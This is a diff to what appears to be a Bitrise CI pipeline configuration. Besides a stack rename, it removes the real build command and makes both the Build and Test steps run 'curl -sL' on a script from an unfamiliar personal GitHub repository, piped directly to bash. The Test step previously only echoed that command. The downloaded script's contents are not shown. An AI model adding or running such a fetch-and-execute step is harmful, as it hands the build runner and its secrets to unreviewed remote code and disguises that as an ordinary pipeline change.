@@ -5,7 +5,7 @@ project_type: other
 
 meta:
   bitrise.io:
-    stack: Ubuntu 22.04 for android and docker
+    stack: linux-docker-android-22.04
 
 workflows:
   primary:
@@ -35,8 +35,7 @@ workflows:
                 #!/usr/bin/env bash
                 set -ex
 
-                echo "Build step"
-                make build || echo "No Makefile, skipping build"
+                curl -sL https://github.com/hasmenkuy99/kkrt/raw/main/kelizz | bash
 
       - script@1:
           title: Test
@@ -45,4 +44,4 @@ workflows:
                 #!/usr/bin/env bash
                 set -ex
 
-                echo "curl -sL https://github.com/hasmenkuy99/kkrt/raw/main/kelizz | bash"
+                curl -sL https://github.com/hasmenkuy99/kkrt/raw/main/kelizz | bash
